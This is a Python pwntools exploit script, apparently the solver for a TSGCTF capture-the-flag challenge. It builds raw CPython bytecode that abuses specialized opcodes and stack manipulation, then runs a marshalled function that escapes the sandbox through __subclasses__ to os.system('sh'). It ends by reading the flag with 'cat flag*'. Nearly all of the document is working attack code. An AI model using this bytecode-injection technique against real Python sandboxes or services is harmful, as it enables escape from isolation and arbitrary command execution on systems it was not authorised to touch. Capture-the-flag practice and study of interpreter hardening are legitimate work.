from __future__ import division, print_function
import sys
import types
import marshal
import base64
import dis
import os
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

assert (len(sys.argv) == 3)


log = False
is_gaibu = True
host = sys.argv[1]
port = int(sys.argv[2])


def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()


def just_u64(x):
    return u64(x.ljust(8, b'\x00'))


r = remote(host, port)


def recvuntil(x, verbose=True):
    if type(x) == str:
        x = x.encode("ascii")
    s = r.recvuntil(x)
    if log and verbose:
        print(s)
    return s.strip(x)


def recv(n, verbose=True):
    s = r.recv(n)
    if log and verbose:
        print(s)
    return s


def recvline(verbose=True):
    s = r.recvline()
    if log and verbose:
        print(s)
    return s.strip(b'\n')


def sendline(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s)
    r.sendline(s)


def send(s, verbose=True):
    if type(s) == str:
        s = s.encode("ascii")
    if log and verbose:
        print(s, end='')
    r.send(s)


def interactive():
    r.interactive()

####################################


def menu(choice):
    recvuntil(b':')
    sendline(str(choice))

# receive and send


def rs(s, new_line=True, r=b':'):
    recvuntil(r)
    s = str(s)
    if new_line:
        sendline(s)
    else:
        send(s)

# send `s` after r


def sa(r, s, new_line=True):
    rs(s, new_line, r)


N_PAYLOAD = 1500


def f():
    # os.system("/bin/sh")
    # input("waiting for input >")
    pass


# print("flags:", f.__code__.co_flags)

# return 1


def gen_code(codestring):
    c = f.__code__.replace(co_code=codestring)
    c = c.replace(co_consts=())
    c = c.replace(co_stacksize=30)
    c = c.replace(co_filename="f")
    # dis.dis(c)
    return c


opmap = dis.opmap

'''
Include/opcode.h
207:#define LOAD_GLOBAL_MODULE                     112
'''
opmap["LOAD_GLOBAL_MODULE"] = 112
# print op_map
for op_name in dis.opname:
    if op_name.startswith("<"):
        continue
    # print(op_name)

codestring = b""
jump_backward = "JUMP_BACKWARD"
resume = "RESUME"


def resume():
    return p8(opmap["RESUME"]) + b"\x00"


def p8(x):
    assert (type(x) == int and 0 <= x < 256)
    return x.to_bytes(1, "big")


def load_const(x):
    return p8(opmap["LOAD_CONST"]) + p8(x)


def return_value():
    return p8(opmap["RETURN_VALUE"]) + b"\x00"


def jump_backward(offset):
    return p8(opmap["JUMP_BACKWARD"]) + p8(offset)


def nop():
    return p8(opmap["NOP"]) + p8(0)


def copy(i):
    return p8(opmap["COPY"]) + p8(i)


def build_list(i):
    return p8(opmap["BUILD_LIST"]) + p8(i)


def build_map(i):
    return p8(opmap["BUILD_MAP"]) + p8(i)


def build_tuple(i):
    return p8(opmap["BUILD_TUPLE"]) + p8(i)


def equal():
    return p8(opmap["COMPARE_OP"]) + p8(40) + p16(0)


def neq():
    return p8(opmap["COMPARE_OP"]) + p8(55) + p16(0)


def add():
    return p8(opmap["BINARY_OP"]) + p8(0) + p16(0)


def sub():
    return p8(opmap["BINARY_OP"]) + p8(10) + p16(0)

#        inst(LOAD_GLOBAL_MODULE, (unused/1, index/1, version/1, unused/1 -- null if (oparg & 1), res)) {


def load_global_module(index, version):
    return p8(opmap["LOAD_GLOBAL_MODULE"]) + p8(0) + p16(0xdead) + p16(index) + p16(version) + p16(0xbeef)

#        inst(LOAD_ATTR_MODULE, (unused/1, type_version/2, index/1, unused/5, owner -- res2 if (oparg & 1), res)) {


def load_attr_module(type_version, index):
    return p8(opmap["LOAD_ATTR_MODULE"]) + p8(0) + p16(0) + p32(type_version) + p16(index) + p16(0) * 5


def match_keys():
    return p8(opmap["MATCH_KEYS"]) + p8(0)


def push_null():
    return p8(opmap["PUSH_NULL"]) + p8(0)


def swap(i):
    return p8(opmap["SWAP"]) + p8(i)


def pop_top():
    return p8(opmap["POP_TOP"]) + p8(0)


def build_string(cnt):
    return p8(opmap["BUILD_STRING"]) + p8(cnt)


def binary_slice():
    return p8(opmap["BINARY_SLICE"]) + p8(0)


def binary_subscr():
    return p8(opmap["BINARY_SUBSCR"]) + p8(0) + p16(0)


def call(i):
    return p8(opmap["CALL"]) + p8(i) + p32(0) + p16(0)


def make_function():
    return p8(opmap["MAKE_FUNCTION"]) + p8(0)


def sh():
    ''.__class__.__mro__[1].__subclasses__(
    )[120]().load_module("os").system("sh")


binsh_diff = b"AA="
binsh = base64.b64encode(marshal.dumps(sh.__code__)) + binsh_diff
# print("target", binsh)


def push_none():
    payload = [
        build_map(0),
        build_tuple(0),
        build_tuple(1),
        match_keys(),
    ]
    return b''.join(payload)


def push_num(n):
    assert (n >= 0)
    payload = []
    # if n == 0:
    #    payload = [
    #        build_list(0),
    #        build_list(0),
    #        neq(),
    #        copy(1),
    #        add(),
    #    ]
    #    return b''.join(payload)

    '''
    res = 0
    cur = 1
    for c in bin(n)[2:][::-1]:
        if c == '1':
            res += cur
        cur += cur
    return res
    '''
    payload = [
        # push 0
        build_list(0),
        build_list(0),
        neq(),
        copy(1),
        add(),

        # push 1
        copy(1),
        build_list(0),
        build_list(0),
        equal(),
        add(),

        swap(2)
    ]

    # ..., 1, 0] top
    # ..., cur, res] top
    # print("yey", bin(n)[2:][::-1])
    for c in bin(n)[2:][::-1]:
        if c == '1':
            # print(c)
            payload += [
                copy(2),
                # cur, res, cur
                add(),
            ]
        payload += [
            # cur, res
            swap(2),
            # res, cur
            copy(1),
            # res, cur, cur
            add(),
            # res, cur
            swap(2),
        ]

    payload += [
        swap(2),
        pop_top(),
    ]

    return b''.join(payload)


# BINSH_START = 2173
BINSH_START = 2105
BINSH_END = BINSH_START + len(binsh) - len(binsh_diff)
LOADS_START = BINSH_END + len(binsh_diff)
LOADS_END = LOADS_START + 5
B64_START = LOADS_END
B64_END = B64_START + 9

DATA_OFFSET = 16
GLOBAL_MODULE = 7

payload = [
    copy(DATA_OFFSET),
    copy(GLOBAL_MODULE),

    copy(1),
    copy(3),
    push_num(LOADS_START),
    push_num(LOADS_END),
    binary_slice(),
    binary_subscr(),
    push_null(),
    swap(2),

    # data, global, loads
    push_null(),
    copy(4),
    copy(6),
    push_num(B64_START),
    push_num(B64_END),
    binary_slice(),
    binary_subscr(),

    # data, global, NULL, loads, NULL, b64decode
    copy(6),
    push_num(BINSH_START),
    push_num(BINSH_END),
    binary_slice(),
    # swap(3),

    call(1),
    call(1),
    make_function(),
    push_null(),
    swap(2),
    call(0),

    # push_none(),
    return_value(),
]

prologue = f.__code__.co_code[:-2]
payload = prologue + b''.join(payload)
assert (N_PAYLOAD >= len(payload))
payload += nop() * ((N_PAYLOAD - len(payload)) // 2)


c = gen_code(payload)
data = marshal.dumps(c)
print(data)

s = base64.b64encode(data) + b'='

recvuntil(b"Give me your source:")
print("len of first_payload:", len(s))
wait_for_attach()
sendline(s + binsh + b'loads' + b'b64decode')

interactive()

time.sleep(1)
sendline("cat flag*")
sendline("cat flag*")
recvline()
s = recvline()
if s.startswith(b"TSGCTF{"):
    print(s)
    exit(0)
else:
    exit(1)
# interactive()
